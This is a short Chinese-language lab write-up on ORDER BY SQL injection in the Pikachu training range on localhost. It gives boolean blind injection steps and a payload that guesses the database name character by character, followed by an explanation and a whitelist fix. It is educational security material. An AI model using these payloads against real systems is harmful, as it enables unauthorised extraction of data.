# Pikachu | SQL注入 order by注入
## 一、漏洞简介
order by后面的参数，不能union，不能and，用注入判断排序方式，盲注。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_order.php
## 三、复现步骤
1. ?sort=id 正常排序；?sort=1 desc 倒序
2. 利用if盲注：`?sort=if(1=1,id,email)` 和 `?sort=if(1=2,id,email)` 页面排序结果不一样
3. 根据页面返回差异，布尔盲注猜数据
## 四、Payload
`?sort=if((substr(database(),1,1)='p'),id,email)`
## 五、漏洞原理
order by 之后的参数直接拼接，不能用union，只能布尔盲注。
## 六、修复方案
排序参数做白名单，只能指定id/name，禁止直接用户输入。
## 七、总结
order by注入是布尔盲注经典场景。